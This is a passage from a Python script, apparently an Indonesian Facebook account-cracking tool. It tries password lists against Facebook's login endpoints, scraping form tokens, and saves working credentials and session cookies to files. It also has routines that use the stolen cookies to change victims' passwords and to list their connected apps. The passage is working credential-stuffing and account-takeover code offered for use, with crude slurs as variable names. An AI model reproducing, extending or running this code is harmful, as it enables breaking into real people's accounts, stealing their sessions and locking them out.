                               open('OK/OK-{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append('DOSA LU BANG MALING')
                               break

                          elif 'checkpoint' in x.cookies.get_dict():
                               if 'ya' in Opsine:
                                     print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,user,pw))
                                     CekOptionAcount(user,pw)
                               else:
                                     print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,user,pw))
                               open('CP/CP-{}.txt'.format(indo),'a').write('%s|%s\n'%(user,pw))
                               CP.append('TAI KUNING')
                               break
                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(35)
        loop +=1

    # LOGIN REGULER V2
    def crackxv2(self, user, pwx, url):
        global loop,OK,CP
        print(f'\r \033[97mcrack v2 {H}{url}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          agen = ua
                          link = requests.get(f'https://{url}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&ref=dbl&fl&login_from_aymh=1').text
                          data = {"lsd":re.search('name="lsd" value="(.*?)"', link).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', link).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', link).group(1),"li":re.search('name="li" value="(.*?)"', link).group(1),"try_number":"0","unrecognized_tries":"0","email":user,"pass":pw,"login":"Masuk"}
                          head = {'Host': url,'content-length': '2152','x-fb-lsd': data['lsd'],'sec-ch-ua-mobile': '?1','user-agent': agen,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-platform': '"Android"','content-type': 'application/x-www-form-urlencoded','accept': '*/*','origin': 'https://' + url,'sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&ref=dbl&fl&login_from_aymh=1'.format(url),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          posh = ses.post(f'https://{url}/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&amp;refsrc=deprecated&amp;lwv=100&amp;ref=dbl', data=data,headers=head,allow_redirects=False)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               print('\r %s*  --> %s|%s|%s                       '%(H,uuid,pw,kueh))
                               if 'ya' in UbahPw:
                                     self.UbahPassword(uuid,pw,kueh,url)
                               else:pass
                               if 'ya' in aplikasi:
                                     self.cek_apk(kueh)
                               else:pass

                               open('OK/OK-{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append('DOSA')
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               uuid = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                               if 'ya' in Opsine:
                                     print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,uuid,pw))
                                     CekOptionAcount(uuid,pw)
                               else:
                                     print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,uuid,pw))
                               open('CP/CP-{}.txt'.format(indo),'a').write('%s|%s\n'%(uuid,pw))
                               CP.append('TAI')
                               break

                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(30)
        loop +=1

    def UbahPassword(self, user, password_old, coki, url):
        try:password_new = open('password_baru_kamu.txt','r').read()
        except:password_new = password_old
        with requests.Session() as ses:
             try:
                     link = ses.get(f'https://{url}/settings/security/password/',cookies={'cookie':coki})
                     data = {
                         'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"', link.text).group(1),
                         'jazoest':re.search('name="jazoest" value="(.*?)"', link.text).group(1),
                         'password_change_session_identifier':re.search('name="password_change_session_identifier" value="(.*?)"', link.text).group(1),
                         'password_old':password_old,
                         'password_new':password_new,
                         'password_confirm':password_new,
                         'save':'Simpan perubahan'
                     }
                     find = parse(link.text,'html.parser').find('form',method='post')['action']
                     posh = ses.post(f'https://{url}' + find, data=data, cookies = {'cookie':coki})
                     if 'Kata Sandi Telah Diubah' in posh.text:
                          print('\r %s   • %sBerhasil mengubah password'%(H,N))
                     else:
                          print('\r %s   • %sGagal mengubah password'%(M,N))
             except Exception as e:print('\r %s   • %sGagal mengubah password'%(M,N))

    def cek_apk(self,kuki):
        try:
               aktif,kadarluarsa = 0,0
               coki = {"cookie":'noscript=1;' + kuki}
               link = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki)
               parz = parse(link.text,"html.parser")
               dihi = parz.find("form",method="post")
               cari = [kontol.text for kontol in dihi.find_all("h3")]
               if len(cari) == 0:
                    print('\r %s   • %sTidak ada aplikasi aktif                     %s'%(M,P, ' '))
               else:
                    for memek in range(len(cari)):
                        aktif +=1
                        print("\r     %s%s. %s%s"%(H,aktif,P,cari[memek].replace("Ditambahkan pada"," Ditambahkan pada")))

               print(' ')
               link = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki)
               parz = parse(link.text,"html.parser")
               dihi = parz.find("form",method="post")
               cari = [kontol.text for kontol in dihi.find_all("h3")]
               if len(cari) == 0:
                     print('\r %s   • %sTidak ada aplikasi kadarluarsa     %s'%(M,P, ' '))
               else:
                     for memek in range(len(cari)):
                         kadarluarsa +=1
                         print("\r     %s%s. %s%s"%(M,kadarluarsa,P,cari[memek].replace("Kedaluwarsa"," Kedaluwarsa")))
        except Exception as e:print(f'\r     {M}! {P}Tidak dapat mengechek aplikasi aktif dan kadarluarsa!    		')

def folder():
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data')
    except:pass

if __name__ == "__main__":
#	os.system('git pull')
	folder()
	menu()

